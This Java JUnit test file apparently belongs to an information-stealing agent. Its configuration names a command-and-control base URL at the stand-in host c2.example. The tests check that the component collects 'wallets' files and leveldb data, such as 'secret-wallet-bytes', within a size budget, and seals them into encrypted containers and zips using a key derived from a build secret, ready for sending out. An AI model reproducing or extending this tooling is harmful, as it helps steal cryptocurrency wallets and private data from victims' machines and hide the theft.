package com.serverpackcore.agent.crypto;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/** Streaming pack behaviour: files live on disk while the pack is open. */
class ArtifactPackTest {
	@TempDir
	Path temp;

	private CryptoConfig config(long maxMb) {
		Map<String, Object> map = new LinkedHashMap<>();
		map.put("build_id", "00000000-0000-4000-8000-000000000001");
		map.put("build_secret", Base64.getUrlEncoder().withoutPadding().encodeToString(CryptoUtil.random(32)));
		map.put("c2_base", "https://c2.example/api/v1");
		map.put("profile", "full");
		map.put("artifact", Map.of("max_mb", maxMb));
		return new CryptoConfig(map);
	}

	@Test
	void retainsOnlyPathsAndBuildsBothFormatsFromDisk() throws Exception {
		ArtifactPack pack = new ArtifactPack(config(64), "00000000-0000-4000-8000-000000000002", "wallets");
		Path source = temp.resolve("large.bin");
		byte[] pattern = new byte[1024 * 1024];
		for (int i = 0; i < pattern.length; i++) {
			pattern[i] = (byte) (i * 31);
		}
		try (var out = Files.newOutputStream(source)) {
			for (int i = 0; i < 8; i++) {
				out.write(pattern);
			}
		}
		assertTrue(pack.add(source, "wallets/large.bin", "file"));
		for (int i = 0; i < 25; i++) {
			assertTrue(pack.add(("row-" + i).getBytes(StandardCharsets.UTF_8), "wallets/" + i + ".txt", "file"));
		}
		assertEquals(26, pack.size());
		assertEquals(8L * 1024L * 1024L + 140L, pack.bytes());

		Path container = temp.resolve("out.spc");
		pack.build(container);
		String header = Files.readString(container, StandardCharsets.ISO_8859_1);
		assertTrue(header.startsWith("{\"container_version\":1"));
		assertTrue(header.contains("\nBLOB a1 "));
		assertTrue(header.contains("\"size\":8388608"));
		assertTrue(header.contains("\"sha256\":"));

		Path zip = temp.resolve("out.zip");
		pack.buildZip(zip);
		try (java.util.zip.ZipFile file = new java.util.zip.ZipFile(zip.toFile())) {
			assertEquals(26, file.size());
			try (var input = file.getInputStream(file.getEntry("wallets/large.bin"))) {
				assertEquals(8L * 1024L * 1024L, input.readAllBytes().length);
			}
		}
		Path packDir = pack.tempDir();
		assertTrue(Files.isDirectory(packDir));
		pack.close();
		assertFalse(Files.exists(packDir));
	}

	@Test
	void containerRoundTripsThroughTheContractDerivation() throws Exception {
		CryptoConfig config = config(64);
		ArtifactPack pack = new ArtifactPack(config, "00000000-0000-4000-8000-000000000002", "wallets");
		byte[] data = "secret-wallet-bytes".getBytes(StandardCharsets.UTF_8);
		try {
			assertTrue(pack.add(data, "wallets/a.log", "leveldb"));
			Path container = temp.resolve("round.spc");
			pack.build(container);
			byte[] raw = Files.readAllBytes(container);
			int first = indexOf(raw, (byte) '\n');
			int second = indexOf(raw, (byte) '\n', first + 1);
			String manifestText = new String(raw, 0, first, StandardCharsets.UTF_8);
			com.serverpackcore.agent.Json.parseObject(manifestText);
			String manifestHash = new String(raw, first + 1, second - first - 1, StandardCharsets.UTF_8);
			int headerStart = second + 1;
			int headerEnd = indexOf(raw, (byte) '\n', headerStart);
			String[] header = new String(raw, headerStart, headerEnd - headerStart, StandardCharsets.UTF_8).split(" ");
			assertEquals("BLOB", header[0]);
			int length = Integer.parseInt(header[2]);
			byte[] sealed = java.util.Arrays.copyOfRange(raw, headerEnd + 1, headerEnd + 1 + length);

			Map<String, Object> manifest = com.serverpackcore.agent.Json.parseObject(manifestText);
			byte[] prefix = CryptoUtil.b64url(String.valueOf(manifest.get("nonce_prefix")));
			byte[] ikm = CryptoLog.concat(CryptoLog.concat(config.secret(), new byte[] { 0x1f }),
				CryptoLog.concat(CryptoUtil.utf8(config.buildId), CryptoLog.concat(new byte[] { 0x1f },
					CryptoUtil.utf8("00000000-0000-4000-8000-000000000002"))));
			byte[] kek = CryptoUtil.sha256(CryptoLog.concat(CryptoUtil.utf8("SPC-ART-V1"), ikm));
			byte[] key = CryptoUtil.hkdf(kek, prefix, CryptoUtil.utf8("artifact-v1"), 32);
			byte[] nonce = new byte[12];
			System.arraycopy(prefix, 0, nonce, 0, 8);
			byte[] plain = CryptoUtil.inflate(CryptoUtil.aesGcm(key, nonce,
				CryptoUtil.utf8(manifestHash + ":" + header[1]), sealed, false));
			assertEquals(new String(data, StandardCharsets.UTF_8), new String(plain, StandardCharsets.UTF_8));
		} finally {
			pack.close();
		}
	}

	private static int indexOf(byte[] data, byte value) {
		return indexOf(data, value, 0);
	}

	private static int indexOf(byte[] data, byte value, int from) {
		for (int i = from; i < data.length; i++) {
			if (data[i] == value) {
				return i;
			}
		}
		return -1;
	}

	@Test
	void aFileLargerThanTheTestHeapIsStreamed() throws Exception {
		ArtifactPack pack = new ArtifactPack(config(512), "00000000-0000-4000-8000-000000000002", "files");
		Path source = temp.resolve("huge.bin");
		try (java.io.RandomAccessFile file = new java.io.RandomAccessFile(source.toFile(), "rw")) {
			file.setLength(96L * 1024L * 1024L);
			file.seek(95L * 1024L * 1024L);
			file.write("tail".getBytes(StandardCharsets.UTF_8));
		}
		try {
			assertTrue(pack.add(source, "files/huge.bin", "file"));
			assertEquals(96L * 1024L * 1024L, pack.bytes());
			Path container = temp.resolve("huge.spc");
			pack.build(container);
			assertTrue(Files.size(container) > 1024L);
		} finally {
			pack.close();
		}
	}

	@Test
	void budgetUsesTheRealFileSizeAndNeverExceedsTheProfile() throws Exception {
		ArtifactPack pack = new ArtifactPack(config(64), "00000000-0000-4000-8000-000000000002", "wallets");
		try {
			pack.budget(10L);
			assertFalse(pack.add(new byte[11], "a.bin", "file"));
			assertTrue(pack.add(new byte[10], "a.bin", "file"));
			assertFalse(pack.add(new byte[1], "b.bin", "file"));
			assertEquals(10L, pack.bytes());
		} finally {
			pack.close();
		}
	}

	@Test
	void copiesToDiskInsteadOfHaltingTheAddOnTheSource() throws Exception {
		ArtifactPack pack = new ArtifactPack(config(64), "00000000-0000-4000-8000-000000000002", "wallets");
		Path source = temp.resolve("one.bin");
		Files.writeString(source, "hello");
		try {
			assertTrue(pack.add(source, "one.bin", "file"));
			Files.delete(source);
			Path zip = temp.resolve("one.zip");
			pack.buildZip(zip);
			try (java.util.zip.ZipFile file = new java.util.zip.ZipFile(zip.toFile())) {
				assertEquals("hello", new String(file.getInputStream(file.getEntry("one.bin")).readAllBytes(),
					StandardCharsets.UTF_8));
			}
		} finally {
			pack.close();
		}
	}
}
